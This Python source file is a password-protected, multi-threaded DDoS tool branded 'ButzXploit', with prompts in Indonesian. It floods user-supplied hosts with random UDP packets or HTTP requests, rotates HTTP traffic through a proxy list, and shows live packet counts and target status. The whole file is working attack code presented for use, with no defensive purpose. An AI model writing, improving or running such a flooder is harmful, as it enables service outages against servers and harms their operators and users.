# -*- coding: utf-8 -*-
import os, sys, time, random, socket, threading, requests
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
from rich.table import Table

console = Console()
PASSWORD = "butz"

# ==== Load proxies ====
def load_proxies():
    try:
        with open("ips.txt","r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print("[bold red]File ips.txt tidak ditemukan![/bold red]")
        sys.exit()

proxies = load_proxies()
proxy_index = 0
proxy_lock = threading.Lock()

def get_next_proxy():
    global proxy_index
    with proxy_lock:
        if not proxies: return None
        proxy = proxies[proxy_index % len(proxies)]
        proxy_index += 1
        return proxy

def clear(): os.system("clear")

# ==== Splash & Login ====
def splash():
    clear()
    logo = """
██╗   ██╗██████╗ ███████╗███████╗██╗██╗  ██╗
██║   ██║██╔══██╗██╔════╝██╔════╝██║██║ ██╔╝
██║   ██║██████╔╝█████╗  █████╗  ██║█████╔╝ 
██║   ██║██╔═══╝ ██╔══╝  ██╔══╝  ██║██╔═██╗ 
╚██████╔╝██║     ███████╗███████╗██║██║  ██╗
 ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚═╝╚═╝  ╚═╝
[VVIP III GACOR MODE + LIVE LOG]
"""
    console.print(Panel(logo, title="[ButzXploit]"))
    time.sleep(1)

def login():
    clear()
    for _ in range(3):
        pw = console.input("Masukkan password VVIP III: ")
        if pw==PASSWORD:
            console.print("[bold green]Login berhasil![/bold green]")
            return
        else:
            console.print("[bold red]Password salah![/bold red]")
    sys.exit()

# ==== Check server alive ====
def check_server(target, port, mode):
    try:
        if mode=="UDP":
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(b"PING",(target,port))
            s.close()
        else:
            requests.get(f"http://{target}", timeout=2)
        return "UP"
    except:
        return "DOWN"

# ==== Attack Thread ====
def ddos_attack(target, port, mode, duration, stats, logs):
    end = time.time() + duration
    while time.time()<end:
        proxy = get_next_proxy()
        status = check_server(target, port, mode)
        try:
            if mode=="UDP":
                s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024),(target,port))
                s.close()
            else:
                if proxy:
                    requests.get(f"http://{target}", proxies={"http": f"http://{proxy}","https": f"http://{proxy}"}, timeout=1)
                else:
                    requests.get(f"http://{target}", timeout=1)
        except: status="DOWN"
        # Update stats
        with stats["lock"]:
            stats["packets"] +=1
        # Update live logs
        with stats["lock"]:
            logs[target] = status

# ==== Multi-target DDoS ==== #
def multi_ddos():
    clear()
    console.print(Panel("[VVIP III Multi-Target DDoS + LIVE LOG]", subtitle="By ButzXploit GACOR"))
    targets_raw = console.input("Masukkan target IP/host (pisahkan koma): ")
    targets = [t.strip() for t in targets_raw.split(",") if t.strip()]
    try:
        port = int(console.input("Port target: "))
        threads = int(console.input("Threads per target: "))
        duration = int(console.input("Durasi (detik): "))
    except ValueError:
        console.print("[bold red]Input harus angka![/bold red]")
        return
    mode = console.input("Mode [UDP/HTTP]: ").upper()
    
    stats = {"packets":0, "lock":threading.Lock()}
    logs = {t:"WAIT" for t in targets}
    thread_list=[]
    
    for target in targets:
        for _ in range(threads):
            t=threading.Thread(target=ddos_attack,args=(target, port, mode, duration, stats, logs))
            t.start()
            thread_list.append(t)
    
    # Live stats + log panel
    with Live(console=console, refresh_per_second=2) as live:
        start=time.time()
        try:
            while time.time()-start<duration:
                elapsed=int(time.time()-start)
                table = Table(title="VIP MINIMAL KALO MAU RENAME IJIN DULU ANJING", show_lines=True)
                table.add_column("Target")
                table.add_column("Status")
                table.add_column("Packets Sent")
                table.add_column("Proxy Aktif")
                for t in targets:
                    table.add_row(t, logs[t], str(stats["packets"]), str(get_next_proxy()))
                live.update(table)
                time.sleep(0.5)
        except KeyboardInterrupt:
            console.print("[bold yellow]Attack dihentikan user[/bold yellow]")
    
    for t in thread_list: t.join()
    console.input("Tekan Enter untuk kembali ke menu")

# ==== Menu ==== #
def menu():
    clear()
    console.print("[bold cyan]VVIP III GACOR Menu[/bold cyan]")
    console.print("1. Multi-Target DDoS + Live Log")
    console.print("2. Keluar")
    choice = console.input("Pilih: ")
    if choice=="1": multi_ddos()
    elif choice=="2": sys.exit()
    else: menu()
    menu()

# ==== MAIN ==== #
if __name__=="__main__":
    splash()
    login()
    menu()
